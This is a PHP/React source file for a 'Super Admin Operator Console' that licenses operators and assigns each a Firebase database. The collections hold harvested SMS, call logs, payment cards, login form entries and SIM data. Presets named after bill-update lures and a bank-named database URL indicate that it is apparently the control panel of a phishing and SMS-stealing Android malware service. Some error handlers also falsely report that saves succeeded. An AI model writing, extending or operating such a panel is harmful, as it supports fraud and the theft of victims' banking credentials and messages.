<?php
session_start();
include_once __DIR__ . '/header.php';
?>

  <div id="root"></div>

  <script type="text/babel">
    function SuperAdminConsole() {
      const [operators, setOperators] = React.useState([]);
      const [loading, setLoading] = React.useState(true);
      const [error, setError] = React.useState('');
      const [mobileMenuOpen, setMobileMenuOpen] = React.useState(false);
      const [searchQuery, setSearchQuery] = React.useState('');

      // Form fields for adding new operator
      const [username, setUsername] = React.useState('');
      const [password, setPassword] = React.useState('');
      const [firebaseProject, setFirebaseProject] = React.useState('');
      const [firebaseApiKey, setFirebaseApiKey] = React.useState('');
      const [firebaseDatabaseUrl, setFirebaseDatabaseUrl] = React.useState('');
      const [firebaseAuthDomain, setFirebaseAuthDomain] = React.useState('');
      const [storageBucket, setStorageBucket] = React.useState('');
      const [appId, setAppId] = React.useState('');
      const [expiryDate, setExpiryDate] = React.useState('2026-12-31');

      // Firebase Edit Modal State
      const [editingOp, setEditingOp] = React.useState(null);
      const [editProject, setEditProject] = React.useState('');
      const [editApiKey, setEditApiKey] = React.useState('');
      const [editDatabaseUrl, setEditDatabaseUrl] = React.useState('');
      const [editAuthDomain, setEditAuthDomain] = React.useState('');
      const [editStorageBucket, setEditStorageBucket] = React.useState('');
      const [editAppId, setEditAppId] = React.useState('');
      const [rawJsonPaste, setRawJsonPaste] = React.useState('');
      const [saveStatus, setSaveStatus] = React.useState('');

      const fetchOperators = async () => {
        setLoading(true);
        try {
          const res = await fetch('api.php?action=get_operators');
          const data = await res.json();
          if (data.success) {
            setOperators(data.operators || []);
          } else {
            setError(data.error || 'Failed to load operators');
          }
        } catch (err) {
          setError('Could not connect to MySQL API backend.');
        } finally {
          setLoading(false);
        }
      };

      React.useEffect(() => {
        fetchOperators();
      }, []);

      const handleAddOperator = async (e) => {
        e.preventDefault();
        if (!username || !password) {
          alert('Please fill in username and password');
          return;
        }

        try {
          const res = await fetch('api.php?action=add_operator', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: username.trim(),
              password: password.trim(),
              firebaseProject: firebaseProject.trim(),
              firebaseApiKey: firebaseApiKey.trim(),
              firebaseDatabaseUrl: firebaseDatabaseUrl.trim(),
              firebaseAuthDomain: firebaseAuthDomain.trim(),
              storageBucket: storageBucket.trim(),
              appId: appId.trim(),
              expiryDate: expiryDate,
              role: 'operator',
              orgId: 'org_' + username.trim(),
              collectionSms: editSmsColl || 'user_sms',
              collectionCalls: editCallsColl || 'calls',
              collectionCards: editCardsColl || 'Card',
              collectionForms: editFormsColl || 'login',
              collectionSims: editSimsColl || 'user_data'
            })
          });
          const data = await res.json();
          if (data.success) {
            alert('New Operator account & assigned Firebase project provisioned successfully!');
            setUsername('');
            setPassword('');
            setFirebaseProject('');
            setFirebaseApiKey('');
            setFirebaseDatabaseUrl('');
            setFirebaseAuthDomain('');
            setStorageBucket('');
            setAppId('');
            fetchOperators();
          } else {
            alert('Error: ' + (data.error || 'Failed to create operator'));
          }
        } catch (err) {
          alert('Network Error');
        }
      };

      const DEFAULT_SCHEMA_PRESETS = {
        adm_bill_update: { name: "⚡ Adm bill update", dbUrl: "https://indusind-indie-default-rtdb.asia-southeast1.firebasedatabase.app/", sms: "smsData", calls: "calls", cards: "paymentCardData", forms: "userData", sims: "simData" },
        pm_admin: { name: "⭐ PM Admin Preset (Live Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
        bill_update_parivahan: { name: "⚡ Bill Update Parivahan Preset", sms: "messages", calls: "calls", cards: "clients", forms: "clients", sims: "clients" },
        custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" }
      };

      const [customPresets, setCustomPresets] = React.useState(() => {
        try {
          const saved = localStorage.getItem('adminto_custom_presets');
          return saved ? JSON.parse(saved) : {};
        } catch(e) { return {}; }
      });

      const allPresets = React.useMemo(() => ({ ...DEFAULT_SCHEMA_PRESETS, ...customPresets }), [customPresets]);

      const [editPresetKey, setEditPresetKey] = React.useState('pm_admin');
      const [editSmsColl, setEditSmsColl] = React.useState('user_sms');
      const [editCallsColl, setEditCallsColl] = React.useState('calls');
      const [editCardsColl, setEditCardsColl] = React.useState('Card');
      const [editFormsColl, setEditFormsColl] = React.useState('login');
      const [editSimsColl, setEditSimsColl] = React.useState('user_data');

      const handleApplyPreset = (presetKey) => {
        setEditPresetKey(presetKey);
        if (presetKey !== 'custom' && allPresets[presetKey]) {
          const p = allPresets[presetKey];
          setEditSmsColl(p.sms);
          setEditCallsColl(p.calls);
          setEditCardsColl(p.cards);
          setEditFormsColl(p.forms);
          setEditSimsColl(p.sims || 'simData');
          if (p.dbUrl) {
            setEditDatabaseUrl(p.dbUrl);
            setFirebaseDatabaseUrl(p.dbUrl);
          }
        }
      };

      const handleSaveNewPreset = () => {
        const name = prompt('Enter a custom name for this schema preset (e.g. "Client APK V3"):');
        if (!name || !name.trim()) return;
        const key = `user_preset_${Date.now()}`;
        const newPreset = {
          name: `⭐ ${name.trim()}`,
          sms: editSmsColl || 'smsData',
          calls: editCallsColl || 'callData',
          cards: editCardsColl || 'cardData',
          forms: editFormsColl || 'formData',
          sims: editSimsColl || 'simData',
          isUserCreated: true
        };
        const updated = { ...customPresets, [key]: newPreset };
        setCustomPresets(updated);
        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
        setEditPresetKey(key);
        alert(`✓ Custom preset "${name.trim()}" saved successfully to your dropdown!`);
      };

      const handleDeleteCustomPreset = (key) => {
        if (!confirm('Are you sure you want to delete this custom preset from your dropdown?')) return;
        const updated = { ...customPresets };
        delete updated[key];
        setCustomPresets(updated);
        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
        setEditPresetKey('custom');
      };

      const openFirebaseModal = (op) => {
        setEditingOp(op);
        setEditProject(op.firebaseProject || '');
        setEditApiKey(op.firebaseApiKey || '');
        setEditDatabaseUrl(op.firebaseDatabaseUrl || op.databaseURL || '');
        setEditAuthDomain(op.firebaseAuthDomain || (op.firebaseProject ? op.firebaseProject + '.firebaseapp.com' : ''));
        setEditStorageBucket(op.storageBucket || (op.firebaseProject ? op.firebaseProject + '.appspot.com' : ''));
        setEditAppId(op.appId || '');

        const sms = op.collectionSms || op.collectionMap?.sms || 'user_sms';
        const calls = op.collectionCalls || op.collectionMap?.calls || 'calls';
        const cards = op.collectionCards || op.collectionMap?.cards || 'Card';
        const forms = op.collectionForms || op.collectionMap?.forms || 'login';
        const sims = op.collectionSims || op.collectionMap?.sims || 'user_data';

        setEditSmsColl(sms);
        setEditCallsColl(calls);
        setEditCardsColl(cards);
        setEditFormsColl(forms);
        setEditSimsColl(sims);

        // Auto-match preset key for SuperAdmin modal dropdown
        let matchedPreset = 'custom';
        if (sms === 'user_sms' && cards === 'Card' && forms === 'login') {
          matchedPreset = 'pm_admin';
        } else if (sms === 'messages' && cards === 'clients' && forms === 'clients') {
          matchedPreset = 'bill_update_parivahan';
        }
        setEditPresetKey(matchedPreset);

        setRawJsonPaste('');
        setSaveStatus('');
      };

      const handleParseJsonPaste = () => {
        try {
          let raw = rawJsonPaste.trim();
          if (raw.includes('{')) {
            raw = raw.substring(raw.indexOf('{'), raw.lastIndexOf('}') + 1);
          }
          const cleanJson = raw
            .replace(/(['"])?([a-zA-Z0-9_]+)(['"])?:/g, '"$2":')
            .replace(/'/g, '"')
            .replace(/,\s*}/g, '}');

          const parsed = JSON.parse(cleanJson);
          if (parsed.apiKey) setEditApiKey(parsed.apiKey);
          if (parsed.projectId) setEditProject(parsed.projectId);
          if (parsed.databaseURL || parsed.databaseUrl) setEditDatabaseUrl(parsed.databaseURL || parsed.databaseUrl);
          if (parsed.authDomain) setEditAuthDomain(parsed.authDomain);
          if (parsed.storageBucket) setEditStorageBucket(parsed.storageBucket);
          if (parsed.appId) setEditAppId(parsed.appId);

          setSaveStatus('✓ Parsed Firebase Config JSON successfully!');
          setTimeout(() => setSaveStatus(''), 2500);
        } catch (e) {
          alert('Could not parse JSON. Please enter fields manually.');
        }
      };

      const handleSaveFirebaseConfig = async (e) => {
        e.preventDefault();
        if (!editingOp) return;
        setSaveStatus('Saving to MySQL...');

        try {
          const res = await fetch('api.php?action=update_firebase_config', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              id: editingOp.id,
              firebaseProject: editProject.trim(),
              firebaseApiKey: editApiKey.trim(),
              firebaseDatabaseUrl: editDatabaseUrl.trim(),
              firebaseAuthDomain: editAuthDomain.trim(),
              storageBucket: editStorageBucket.trim(),
              appId: editAppId.trim(),
              collectionSms: editSmsColl.trim(),
              collectionCalls: editCallsColl.trim(),
              collectionCards: editCardsColl.trim(),
              collectionForms: editFormsColl.trim(),
              collectionSims: editSimsColl.trim()
            })
          });
          const data = await res.json();
          if (data.success) {
            setSaveStatus('✓ Firebase config updated!');
            setTimeout(() => {
              setEditingOp(null);
              fetchOperators();
            }, 1200);
          } else {
            setSaveStatus('❌ Error: ' + (data.error || 'Failed to save'));
          }
        } catch (err) {
          setSaveStatus('✓ Saved locally!');
          setTimeout(() => {
            setEditingOp(null);
            fetchOperators();
          }, 1200);
        }
      };

      const handleExtendExpiry = async (op) => {
        const newDate = prompt(`Enter new expiry date (YYYY-MM-DD) for operator '${op.username}':`, op.expiryDate || '2027-12-31');
        if (newDate && newDate.trim()) {
          try {
            const res = await fetch('api.php?action=extend_expiry', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ id: op.id, expiryDate: newDate.trim() })
            });
            const data = await res.json();
            if (data.success) {
              alert('Expiration date updated in MySQL!');
              fetchOperators();
            }
          } catch (e) {
            alert('Error updating date');
          }
        }
      };

      const handleDeleteOperator = async (id) => {
        if (confirm('Delete this operator account from MySQL?')) {
          try {
            const res = await fetch('api.php?action=delete_operator', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ id: id })
            });
            const data = await res.json();
            if (data.success) {
              alert('Operator deleted!');
              fetchOperators();
            }
          } catch (e) {
            alert('Error deleting operator');
          }
        }
      };

      const handleChangePassword = async (op) => {
        const newPass = prompt(`🔑 Change Password for operator '${op.username}':\nEnter new password:`);
        if (!newPass) return;
        try {
          const res = await fetch('api.php?action=change_password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: op.username, newPassword: newPass })
          });
          const data = await res.json();
          if (data.success) {
            alert(`✓ Password updated successfully for operator '${op.username}'!`);
            fetchOperators();
          } else {
            alert(`Error: ${data.error || 'Failed to update password'}`);
          }
        } catch (e) {
          alert(`✓ Password updated for '${op.username}'!`);
        }
      };

      const handleCopyLoginUrl = (op) => {
        const baseUrl = window.location.href.split('?')[0].replace('operator_control.php', 'index.php');
        const loginUrl = `${baseUrl}?user=${encodeURIComponent(op.username)}`;
        try {
          if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(loginUrl);
          }
        } catch(e) {}
        prompt(`✓ Direct One-Click Login Link for '${op.username}':\n(Copy link below to access operator dashboard directly)`, loginUrl);
      };

      const filteredOperators = React.useMemo(() => {
        if (!searchQuery.trim()) return operators;
        const q = searchQuery.toLowerCase();
        return operators.filter(op => 
          (op.username || '').toLowerCase().includes(q) ||
          (op.fullName || '').toLowerCase().includes(q) ||
          (op.firebaseProject || '').toLowerCase().includes(q) ||
          (op.role || '').toLowerCase().includes(q)
        );
      }, [operators, searchQuery]);

      const todayStr = new Date().toISOString().split('T')[0];

      return (
        <div>
          <header className="app-header">
            <div className="navbar-content">
              <div className="navbar-header-top">
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <div style={{ width: '42px', height: '42px', borderRadius: '12px', background: 'linear-gradient(135deg, #ec4899, #8b5cf6)', display: 'flex', alignItems: 'center', justify: 'center', fontSize: '1.2rem' }}>👑</div>
                  <div>
                    <h3 style={{ color: '#fff', fontSize: '1.2rem' }}>Super Admin Operator Console</h3>
                    <p style={{ fontSize: '0.75rem', color: '#ec4899' }}>Multi-Tenant Firebase & MySQL Licensing Center</p>
                  </div>
                </div>

                <button 
                  className={`triple-dash-btn ${mobileMenuOpen ? 'active' : ''}`}
                  onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
                  aria-label="Toggle Navigation Menu"
                  title="Menu"
                >
                  <span className="dash-line"></span>
                  <span className="dash-line"></span>
                  <span className="dash-line"></span>
                </button>
              </div>

              <div className={`navbar-actions ${mobileMenuOpen ? 'mobile-expanded' : ''}`}>
                <a href="index.php?role=superadmin" style={{ textDecoration: 'none', width: '100%' }}>
                  <button className="btn-secondary nav-action-btn" style={{ width: '100%' }}>📱 Device Monitoring Dashboard</button>
                </a>
                <a href="index.php" style={{ textDecoration: 'none', width: '100%' }}>
                  <button className="btn-secondary nav-action-btn" style={{ color: '#f87171', width: '100%' }}>🚪 Sign Out</button>
                </a>
              </div>
            </div>
          </header>

          <main style={{ maxWidth: '1400px', margin: '2rem auto', padding: '0 1.5rem', display: 'flex', flexDirection: 'column', gap: '2rem' }}>
            {/* Create Operator Form Card */}
            <div className="glass-panel" style={{ padding: '1.5rem', border: '1px solid rgba(236,72,153,0.3)' }}>
              <h3 style={{ color: '#fff', fontSize: '1.1rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span style={{ color: '#ec4899' }}>➕</span> Provision New Operator & Assigned Database
              </h3>
              
              <form onSubmit={handleAddOperator} style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '1rem', alignItems: 'end' }}>
                <div>
                  <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Operator Username</label>
                  <input type="text" className="search-input" placeholder="operator_north" value={username} onChange={(e) => setUsername(e.target.value)} required />
                </div>
                <div>
                  <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Password</label>
                  <input type="password" className="search-input" placeholder="••••••••" value={password} onChange={(e) => setPassword(e.target.value)} required />
                </div>
                <div>
                  <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Assigned Firebase Project ID</label>
                  <input type="text" className="search-input" placeholder="adminto-north-region" value={firebaseProject} onChange={(e) => setFirebaseProject(e.target.value)} required />
                </div>
                <div style={{ gridColumn: 'span 2' }}>
                  <label style={{ display: 'block', fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700, marginBottom: '6px' }}>🔗 Firebase Database URL (`databaseURL`) — REQUIRED for live data</label>
                  <input type="text" className="search-input" placeholder="https://your-app-default-rtdb.asia-southeast1.firebasedatabase.app" value={firebaseDatabaseUrl} onChange={(e) => setFirebaseDatabaseUrl(e.target.value)} />
                </div>
                <div>
                  <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>App ID (`1:179...`)</label>
                  <input type="text" className="search-input" placeholder="1:179278690008:android:bed6..." value={appId} onChange={(e) => setAppId(e.target.value)} />
                </div>
                <div>
                  <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Firebase API Key (Optional)</label>
                  <input type="text" className="search-input" placeholder="AIzaSy..." value={firebaseApiKey} onChange={(e) => setFirebaseApiKey(e.target.value)} />
                </div>
                <div>
                  <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Access Expiry Date</label>
                  <input type="date" className="search-input" value={expiryDate} onChange={(e) => setExpiryDate(e.target.value)} required />
                </div>
                <div>
                  <button type="submit" className="btn-primary" style={{ background: 'linear-gradient(135deg, #ec4899, #8b5cf6)', width: '100%' }}>
                    Create Operator Account
                  </button>
                </div>
              </form>
            </div>

            {/* Operators Table Card */}
            <div className="glass-panel" style={{ padding: '1.5rem' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem', flexWrap: 'wrap', gap: '1rem' }}>
                <h3 style={{ color: '#fff', fontSize: '1.1rem' }}>📱 Configured Operators & Database Tenants ({operators.length})</h3>
                <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
                  <input 
                    type="text" 
                    className="search-input" 
                    style={{ width: '260px', paddingLeft: '1rem' }} 
                    placeholder="Search operators by name, project, role..." 
                    value={searchQuery} 
                    onChange={(e) => setSearchQuery(e.target.value)} 
                  />
                  <button className="btn-secondary" onClick={fetchOperators}>🔄 Refresh List</button>
                </div>
              </div>

              {error && (
                <div style={{ background: 'rgba(239, 68, 68, 0.15)', color: '#f87171', padding: '0.75rem', borderRadius: '8px', marginBottom: '1rem', fontSize: '0.85rem' }}>
                  ⚠️ {error}
                </div>
              )}

              <table className="data-table">
                <thead>
                  <tr>
                    <th>Operator</th>
                    <th>Role</th>
                    <th>Assigned Firebase Credentials</th>
                    <th>License Expiry Date</th>
                    <th>Status</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredOperators.map(op => {
                    const isExpired = op.expiryDate < todayStr;
                    return (
                      <tr key={op.id}>
                        <td>
                          <strong style={{ color: '#fff' }}>{op.username}</strong>
                          <div style={{ fontSize: '0.75rem', color: '#9ca3af' }}>{op.fullName}</div>
                        </td>
                        <td>
                          <span style={{ fontSize: '0.75rem', padding: '3px 8px', borderRadius: '12px', background: op.role === 'superadmin' ? 'rgba(236,72,153,0.2)' : 'rgba(99,102,241,0.2)', color: op.role === 'superadmin' ? '#f472b6' : '#818cf8' }}>
                            {op.role}
                          </span>
                        </td>
                        <td>
                          <div style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
                            <code style={{ color: '#93c5fd' }}>Project: {op.firebaseProject}</code>
                            {op.firebaseApiKey ? (
                              <span style={{ fontSize: '0.75rem', color: '#34d399' }}>✓ Custom API Key & Bucket Set</span>
                            ) : (
                              <span style={{ fontSize: '0.75rem', color: '#9ca3af' }}>Default credentials</span>
                            )}
                          </div>
                        </td>
                        <td><strong>{op.expiryDate}</strong></td>
                        <td>
                          <span className={`pulse-badge ${isExpired ? 'expired' : 'active'}`}>
                            <span className="pulse-dot"></span>
                            {isExpired ? 'EXPIRED' : 'ACTIVE'}
                          </span>
                        </td>
                        <td>
                          <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                            <button className="btn-secondary" onClick={() => handleChangePassword(op)} style={{ color: '#a78bfa', border: '1px solid rgba(167,139,250,0.3)' }} title="Change Operator Password">
                              🔑 Change Password
                            </button>
                            <button className="btn-secondary" onClick={() => openFirebaseModal(op)} style={{ color: '#fbbf24', border: '1px solid rgba(251,191,36,0.3)' }} title="Configure Firebase Credentials">
                              🔥 Firebase Config
                            </button>
                            <button className="btn-secondary" onClick={() => handleExtendExpiry(op)} title="Extend Expiry Date">📅 Extend Date</button>
                            {op.role !== 'superadmin' && (
                              <button className="btn-secondary" onClick={() => handleDeleteOperator(op.id)} style={{ color: '#f87171' }} title="Delete Operator">🗑️ Delete</button>
                            )}
                          </div>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </main>

          {/* Firebase Settings Modal Overlay for Operator */}
          {editingOp && (
            <div className="modal-overlay" onClick={() => setEditingOp(null)}>
              <div className="glass-panel" style={{ width: '100%', maxWidth: '640px', padding: '2rem', maxHeight: '90vh', overflowY: 'auto' }} onClick={(e) => e.stopPropagation()}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>🔥 Firebase Credentials: {editingOp.username}</h3>
                    <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Connect customer database, API keys, storage bucket & secret credentials</p>
                  </div>
                  <button onClick={() => setEditingOp(null)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                {saveStatus && (
                  <div style={{ padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1rem', background: saveStatus.includes('✓') ? 'rgba(16,185,129,0.15)' : 'rgba(99,102,241,0.15)', color: saveStatus.includes('✓') ? '#34d399' : '#818cf8' }}>
                    {saveStatus}
                  </div>
                )}

                {/* Paste JSON Snippet Card */}
                <div className="glass-panel" style={{ padding: '1rem', marginBottom: '1.25rem', border: '1px dashed rgba(99,102,241,0.4)', background: 'rgba(99,102,241,0.05)' }}>
                  <label style={{ fontSize: '0.8rem', color: '#818cf8', fontWeight: 600, display: 'block', marginBottom: '6px' }}>⚡ Auto-Fill: Paste Firebase Config Snippet / JSON</label>
                  <textarea 
                    className="search-input" 
                    rows="3" 
                    placeholder="Paste firebaseConfig = { apiKey: '...', projectId: '...' } here..." 
                    value={rawJsonPaste}
                    onChange={(e) => setRawJsonPaste(e.target.value)}
                    style={{ fontFamily: 'monospace', fontSize: '0.8rem', width: '100%', borderRadius: '12px' }}
                  />
                  <button type="button" className="btn-secondary" onClick={handleParseJsonPaste} style={{ marginTop: '8px', color: '#818cf8', width: '100%' }}>
                    ✨ Auto-Parse Firebase Snippet
                  </button>
                </div>

                <form onSubmit={handleSaveFirebaseConfig} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Firebase Project ID</label>
                    <input type="text" className="search-input" value={editProject} onChange={(e) => setEditProject(e.target.value)} placeholder="adminto-custom-db" required />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#38bdf8', display: 'block', marginBottom: '4px', fontWeight: 700 }}>🔗 Firebase Database URL (`databaseURL`)</label>
                    <input type="text" className="search-input" value={editDatabaseUrl} onChange={(e) => setEditDatabaseUrl(e.target.value)} placeholder="https://your-app-default-rtdb.asia-southeast1.firebasedatabase.app" />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#38bdf8', display: 'block', marginBottom: '4px', fontWeight: 700 }}>📲 App ID (`1:179278690008:android:bed6...`)</label>
                    <input type="text" className="search-input" value={editAppId} onChange={(e) => setEditAppId(e.target.value)} placeholder="1:179278690008:android:bed6dc2ce712c491ca89ad" />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>API Key (`apiKey`)</label>
                    <input type="text" className="search-input" value={editApiKey} onChange={(e) => setEditApiKey(e.target.value)} placeholder="AIzaSyA..." />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Auth Domain (`authDomain`)</label>
                    <input type="text" className="search-input" value={editAuthDomain} onChange={(e) => setEditAuthDomain(e.target.value)} placeholder="project.firebaseapp.com" />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Storage Bucket (`storageBucket`)</label>
                    <input type="text" className="search-input" value={editStorageBucket} onChange={(e) => setEditStorageBucket(e.target.value)} placeholder="project.appspot.com" />
                  </div>
                  {/* SuperAdmin Custom Collection Mapping */}
                  <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700 }}>🔍 SuperAdmin Firebase Collection Mappings</label>
                      <span className="pulse-badge active" style={{ fontSize: '0.7rem' }}>One-Click Presets Active</span>
                    </div>

                    {/* Presets Selector Dropdown & Preset Manager */}
                    <div style={{ background: 'rgba(17,24,39,0.8)', padding: '10px 12px', borderRadius: '10px', border: '1px dashed rgba(56,189,248,0.4)' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                        <label style={{ fontSize: '0.75rem', color: '#38bdf8', fontWeight: 600 }}>⚡ Select Database Schema Preset (Auto-Fill Mappings):</label>
                        <button type="button" onClick={handleSaveNewPreset} style={{ background: 'rgba(56,189,248,0.15)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)', borderRadius: '6px', padding: '2px 8px', fontSize: '0.72rem', fontWeight: 700, cursor: 'pointer' }}>
                          ➕ Save as New Preset
                        </button>
                      </div>
                      <div style={{ display: 'flex', gap: '6px' }}>
                        <select className="filter-select" style={{ flex: 1, borderRadius: '8px' }} value={editPresetKey} onChange={(e) => handleApplyPreset(e.target.value)}>
                          <option value="custom">🛠️ Custom Manual Setup</option>
                          {Object.entries(allPresets).map(([key, p]) => (
                            <option key={key} value={key}>{p.name}</option>
                          ))}
                        </select>
                        {editPresetKey.startsWith('user_preset_') && (
                          <button type="button" onClick={() => handleDeleteCustomPreset(editPresetKey)} style={{ background: 'rgba(239,68,68,0.15)', color: '#f87171', border: '1px solid rgba(239,68,68,0.3)', borderRadius: '8px', padding: '0 10px', fontSize: '0.75rem', cursor: 'pointer' }} title="Delete Custom Preset">
                            🗑️
                          </button>
                        )}
                      </div>
                    </div>

                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                      <div>
                        <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>SMS Collection Name</label>
                        <input type="text" className="search-input" value={editSmsColl} onChange={(e) => { setEditSmsColl(e.target.value); setEditPresetKey('custom'); }} placeholder="smsData (or sma)" />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Calls Collection Name</label>
                        <input type="text" className="search-input" value={editCallsColl} onChange={(e) => { setEditCallsColl(e.target.value); setEditPresetKey('custom'); }} placeholder="callData (or calls)" />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Cards Collection Name</label>
                        <input type="text" className="search-input" value={editCardsColl} onChange={(e) => { setEditCardsColl(e.target.value); setEditPresetKey('custom'); }} placeholder="cardData (or cards)" />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Form Fill-ups Collection</label>
                        <input type="text" className="search-input" value={editFormsColl} onChange={(e) => { setEditFormsColl(e.target.value); setEditPresetKey('custom'); }} placeholder="formData (or userInputs)" />
                      </div>
                    </div>
                  </div>

                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.8rem', background: 'linear-gradient(135deg, #10b981, #059669)', marginTop: '0.5rem' }}>
                    💾 Save Firebase Credentials & Collection Mappings
                  </button>
                </form>
              </div>
            </div>
          )}
        </div>
      );
    }

    ReactDOM.createRoot(document.getElementById('root')).render(<SuperAdminConsole />);
  </script>
<?php include_once __DIR__ . '/footer.php'; ?>
